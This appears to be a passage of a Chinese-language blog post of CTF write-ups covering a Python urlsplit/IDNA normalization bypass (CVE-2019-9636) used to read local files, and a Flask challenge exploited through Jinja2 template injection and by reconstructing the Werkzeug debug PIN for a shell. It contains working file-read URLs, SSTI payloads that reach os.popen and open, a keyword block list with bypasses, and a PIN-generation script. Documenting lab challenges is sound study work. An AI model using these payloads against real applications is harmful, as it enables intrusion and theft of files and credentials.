前两个判断 host 是否是 suctf.cc ，如果不是才能继续，而进入后面的read()又需要host为suctf.cc
urlsplit()是 urllib.parse 模块下的一个函数，跟 urlparse 效果一样用来对 url 进行分割，但是有一点不一样的是 urlsplit 分割出来的没有 params 这个属性。
漏洞原理：
用 Punycode/IDNA 编码的 URL 使用 NFKC 规范化来分解字符。可能导致某些字符将新的段引入 URL。
例如，在直接比较中，\ uFF03不等于’＃’，而是统一化为’＃’，这会更改 URL 的片段部分。类似地，\ u2100 统一化为’a/c’，它引入了路径段。

在unicode中字符℀(U+2100)，当IDNA处理此字符时，会将℀变成a/c，因此当你访问此url时，dns服务器会自动将url重定向到另一个网站。


考点：

　　1.nginx重要文件的位置

　　2.

　　（1）.CVE-2019-9636：urlsplit不处理NFKC标准化

　　（2）.url中的unicode漏洞引发的域名安全问题

　　（3）.python脚本

　　nginx重要文件的位置：　

　　　　配置文件存放目录：/etc/nginx
　　　　主配置文件：/etc/nginx/conf/nginx.conf
　　　　管理脚本：/usr/lib64/systemd/system/nginx.service
　　　　模块：/usr/lisb64/nginx/modules
　　　　应用程序：/usr/sbin/nginx
　　　　程序默认存放位置：/usr/share/nginx/html
　　　　日志默认存放位置：/var/log/nginx
　　　　配置文件目录为：/usr/local/nginx/conf/nginx.conf

查看代码。去/getUrl这个路由中，host接受url传过来的值，然后对host的值进行判断。

方法一：利用了urlsplit不处理NFKC标准化

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/getUrl?url=file:/</span><span class="regexp">//</span><span class="regexp">/suctf.cc/</span>etc/passwd</span><br></pre></td></tr></table></figure>

　　查看nginx的配置文件目录：

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/getUrl?url=file:/</span><span class="regexp">//</span><span class="regexp">/usr/</span>local<span class="regexp">/nginx/</span>conf/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="regexp">/getUrl?url=file:/</span><span class="regexp">//</span><span class="regexp">/suctf.cc/u</span>sr/fffffflag</span><br></pre></td></tr></table></figure>

![image-20220528134400585](./buu/image-20220528134400585.png)

![image-20220528134339886](./buu/image-20220528134339886.png)

方法二：unicode漏洞引发的域名安全问题

　　[url中的unicode漏洞引发的域名安全问题 ](https://xz.aliyun.com/t/6070)

　　[idna与utf-8编码漏洞](https://www.cnblogs.com/cimuhuashuimu/p/11490431.html)

**可以利用的unicode字符**

U+2100, `℀`      U+2101, `℁`        U+2105, `℅`    U+2106, `℆`    U+FF0F,`／`    U+2047, `⁇`    U+2048, `⁈`   U+2049, `⁉`

U+FE16, `︖`     U+FE56, `﹖`   U+FF1F,`？`    U+FE5F, `﹟`    U+FF03, `＃`      U+FE6B, `﹫`    U+FF20, `＠`

　　在这就是℆在经过下面的代码被解释为c/u。

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> host<span class="selector-class">.split</span>(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">      newhost<span class="selector-class">.append</span>(h<span class="selector-class">.encode</span>(<span class="string">&#x27;idna&#x27;</span>)<span class="selector-class">.decode</span>(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

当然其他的符号也可以： 例：用ℂ替换c

payload:

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/getUrl?url=file:/</span><span class="regexp">/suctf.c℆sr/</span>local<span class="regexp">/nginx/</span>conf/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="regexp">/getUrl?url=file:/</span><span class="regexp">/suctf.cℂ/u</span>sr<span class="regexp">/local/</span>nginx<span class="regexp">/conf/</span>nginx.conf</span><br></pre></td></tr></table></figure>

方法三：

　　用python脚本（大佬的WP）

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse,urlunsplit,urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span>():</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">        uni=<span class="built_in">chr</span>(x)</span><br><span class="line">        url=<span class="string">&quot;http://suctf.c&#123;&#125;&quot;</span>.<span class="built_in">format</span>(uni)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;str: &quot;</span>+uni+<span class="string">&#x27; unicode: \\u&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>(<span class="params">url</span>):</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure>

## [GYCTF2020]FlaskApp

![image-20220528153843033](./buu/image-20220528153843033.png)

因为题目名[flask](https://so.csdn.net/so/search?q=flask&spm=1001.2101.3001.7020)，所以先不进行常规信息收集，而是观察功能点，寻找易发生ssti的功能

提示里貌似没有什么信息，考虑到功能异常抛出常见于解密环节，所以随便输段不能解密的

输入123456

直接报错抛出debug信息，开启了debug模式

参见该文章：[Flask开启debug模式等于给黑客留了后门](https://zhuanlan.zhihu.com/p/32138231)

而且读到了app.py的部分代码
 大致的逻辑就是获取text参数，进行解密，如果可以过waf则执行代码

![image-20220528154020859](./buu/image-20220528154020859.png)

![image-20220528154102304](./buu/image-20220528154102304.png)

进一步尝试是否ssti，在加密界面对`&#123;&#123;6*6&#125;&#125;`进行加密，结果为`e3s2KjZ9fQ==`，再在解密界面进行解密，疑似是有一定防御，那么换成&#123;&#123;3+3&#125;&#125;，成功返回6

说明确实存在ssti，接下来就是具体怎么利用的过程了

预备知识

在jinja2中 控制结构 `&#123;% %&#125;` 变量取值 `&#123;&#123; &#125;&#125;`
 函数和属性

<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">__class__</span>         返回调用的参数类型</span><br><span class="line"><span class="variable">__bases__</span>         返回基类列表 </span><br><span class="line"><span class="variable">__mro__</span>           此属性是在方法解析期间寻找基类时的参考类元组 </span><br><span class="line"><span class="variable">__subclasses__</span>()  返回子类的列表 </span><br><span class="line"><span class="variable">__globals__</span>       以字典的形式返回函数所在的全局命名空间所定义的全局变量，与 func_globals 等价 </span><br><span class="line"><span class="variable">__builtins__</span>      内建模块的引用，在任何地方都是可见的(包括全局)，每个 Python 脚本都会自动加载，这个模块包括了很多强大的 built-<span class="built_in">in</span> 函数，例如eval, <span class="built_in">exec</span>, open等等</span><br></pre></td></tr></table></figure>

[python内建函数文档](https://docs.python.org/zh-cn/3/library/functions.html#built-in-funcs)

具体利用

直接读flag

首先想办法把完整的app.py读出来，方便绕waf
 参考[Templates Injections](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection#twig)的payload

<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;</span></span><br><span class="line"><span class="xml">&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span></span><br><span class="line"><span class="xml"></span><span class="template-variable">&#123;&#123;<span class="name">x</span>()._module.__builtins__[&#x27;__import__&#x27;](<span class="name">&#x27;os&#x27;</span>).popen(<span class="name">request.args.input</span>).read()&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">&#123;%endif%&#125;&#123;%endfor%&#125;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">修改成：</span></span><br><span class="line"><span class="xml">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span></span><br><span class="line"><span class="xml">&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span></span><br><span class="line"><span class="xml"></span><span class="template-variable">&#123;&#123; <span class="name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;].open(<span class="name">&#x27;app.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">记得最后要改成一行</span></span><br><span class="line"><span class="xml">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="template-variable">&#123;&#123; <span class="name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;].open(<span class="name">&#x27;app.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">然后加密解密</span></span><br><span class="line"><span class="xml">得到结果</span></span><br><span class="line"><span class="xml"></span></span><br></pre></td></tr></table></figure>

![image-20220528154932107](./buu/image-20220528154932107.png)

把中间的waf函数代码美化一下

<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def waf(str): </span><br><span class="line">  black_list = [ &amp;</span><br><span class="line">    #<span class="number">34</span>;flag&amp;# <span class="number">34</span>;, &amp; #<span class="number">34</span>;os&amp;# <span class="number">34</span>;, &amp; #<span class="number">34</span>;<span class="keyword">system</span>&amp;# <span class="number">34</span>;, &amp;</span><br><span class="line">    #<span class="number">34</span>;popen&amp;# <span class="number">34</span>;, &amp; #<span class="number">34</span>;<span class="keyword">import</span>&amp;# <span class="number">34</span>;, &amp; #<span class="number">34</span>;eval&amp;# <span class="number">34</span>;, &amp;</span><br><span class="line">    #<span class="number">34</span>;chr&amp;# <span class="number">34</span>;, &amp; #<span class="number">34</span>;request&amp;# <span class="number">34</span>;, &amp; #<span class="number">34</span>;subprocess&amp;# <span class="number">34</span>;, &amp;</span><br><span class="line">    #<span class="number">34</span>;commands&amp;# <span class="number">34</span>;, &amp; #<span class="number">34</span>;socket&amp;# <span class="number">34</span>;, &amp; #<span class="number">34</span>;hex&amp;# <span class="number">34</span>;, &amp;</span><br><span class="line">    #<span class="number">34</span>;base64&amp;# <span class="number">34</span>;, &amp; #<span class="number">34</span>;*&amp;# <span class="number">34</span>;, &amp; #<span class="number">34</span>;?&amp;# <span class="number">34</span>;</span><br><span class="line">]</span><br><span class="line">  for x <span class="keyword">in</span> black_list: </span><br><span class="line">    <span class="keyword">if</span> x <span class="keyword">in</span> str.lower(): </span><br><span class="line">      return <span class="number">1</span>@ app.route( &amp;#<span class="number">39</span>;/hint&amp;# <span class="number">39</span>;, methods = [ &amp; #<span class="number">39</span>;GET&amp;# <span class="number">39</span>;])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

字符串拼接绕过

从 black list大致知道了关键字，另外会将字符转小写，所以没法通过lower方法或者base64、hex一下绕过，但是最常见的是字符串拼接绕过，参考[菜鸟教程](https://www.runoob.com/python/os-file-methods.html)找到os模块的一些方法
 先使用listdir方法看看当前目录文件

<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="template-variable">&#123;&#123; <span class="name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](<span class="name">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).listdir(<span class="name">&#x27;/&#x27;</span>)&#125;&#125;</span><span class="xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span></span><br><span class="line"><span class="xml"></span></span><br></pre></td></tr></table></figure>

结果 ： [&#39;bin&#39;, &#39;boot&#39;, &#39;dev&#39;, &#39;etc&#39;, &#39;home&#39;, &#39;lib&#39;, &#39;lib64&#39;, &#39;media&#39;, &#39;mnt&#39;, &#39;opt&#39;, &#39;proc&#39;, &#39;root&#39;, &#39;run&#39;, &#39;sbin&#39;, &#39;srv&#39;, &#39;sys&#39;, &#39;tmp&#39;, &#39;usr&#39;, &#39;var&#39;, &#39;this_is_the_flag.txt&#39;, &#39;.dockerenv&#39;, &#39;app&#39;]

其中this_is_the_flag.txt有flag字样，那么接下来就是想办法读这个文件，还是采用拼接字符串的方式，然后结合内建函数open

<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(<span class="name">&#x27;/this_is_the_fl&#x27;+&#x27;ag.txt&#x27;</span>,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

除了字符串拼接，还可以通过倒序输出的方式利用,倒序输出绕过

即`txt.galf_eht_si_siht/’[::-1]` 将字符倒转输出

<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(<span class="name">&#x27;txt.galf_eht_si_siht/&#x27;</span>[<span class="symbol">::-1</span>],&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

预期解

文件包含，PIN码生成

关于PIN码的相关资料请参考：[Flask debug 模式 PIN 码生成机制安全性研究笔记](https://www.cnblogs.com/HacTF/p/8160076.html)

得到PIN码需要六个信息，其中2和3易知

    flask所登录的用户名
    modname，一般是flask.app
    getattr(app, “name”, app.class.name)。一般为Flask
    flask库下app.py的绝对路径。这个可以由报错信息看出
    当前网络的mac地址的十进制数。
    机器的id。
\1. flask用户名可以通过读取/etc/passwd来知道

<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(<span class="name">&#x27;/etc/passwd&#x27;</span>,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

结果：知道用户名为flaskweb

![image-20220528155811783](./buu/image-20220528155811783.png)

\2. app.py的绝对路径，可从报错信息得到

<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/lib/</span>python3<span class="number">.7</span><span class="regexp">/site-packages/</span>flask/app.py</span><br></pre></td></tr></table></figure>

![image-20220528155907400](./buu/image-20220528155907400.png)

\3. mac地址的十进制数

首先要得到网卡 **/sys/class/net/eth0/address**

<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(<span class="name">&#x27;/sys/class/net/eth0/address&#x27;</span>,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

mac地址

<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">02</span>:<span class="number">42</span>:ac:<span class="number">10</span>:<span class="number">93</span>:<span class="number">07</span></span><br><span class="line">将：去掉</span><br><span class="line"><span class="number">0242</span>ac109307</span><br><span class="line">在<span class="keyword">python</span>中进行转化</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">int</span>(<span class="string">&#x27;0242ac109307&#x27;</span>,<span class="number">16</span>))</span><br><span class="line">​得到</span><br><span class="line"><span class="number">2485377864455</span></span><br></pre></td></tr></table></figure>

docker机器的id

    引用大佬的解释：
    
    对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件。
    
    对于docker机则读取/proc/self/cgroup，其中第一行的/docker/字符串后面的内容作为机器的id，
    
     &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/proc/self/cgroup','r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
</Flask></path:shrine></code></pre>
<p>得到docker机器id，也就是**1:name=systemd:/docker/**之后的字符串<img src="/2022/05/05/buu/image-20220528160111895.png" alt="image-20220528160111895"></p>
<p>生成PIN码</p>
<p>巨佬的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span><span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377864455&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;ad4fc7650590f81ec6ab4e3a40f284a6b5a75454fcb50d6ee5347eba94a124c8&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>PIN码的结果是：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">199-196-476</span><br></pre></td></tr></table></figure>

<p>传入PIN码，终端RCE</p>
<p>然后在报错的界面，点击窗口栏，输入PIN</p>
<p><img src="/2022/05/05/buu/image-20220528160238269.png" alt="image-20220528160238269"></p>
<p><img src="/2022/05/05/buu/image-20220528160250151.png" alt="image-20220528160250151"></p>
<p>终端shell</p>
<p><img src="/2022/05/05/buu/image-20220528160307498.png" alt="image-20220528160307498"></p>
<p>得到flag<img src="/2022/05/05/buu/image-20220528160325563.png" alt="image-20220528160325563"></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/STUDY/" rel="tag"># STUDY</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/04/13/JAVA/" rel="prev" title="JAVA">
                  <i class="fa fa-chevron-left"></i> JAVA
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/05/13/WeChat%E5%B0%8F%E7%A8%8B%E5%BA%8F/" rel="next" title="WeChat小程序">
                  WeChat小程序 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CJ</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="Symbols count total">492k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">7:28</span>
  </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  





  





</body>
</html>
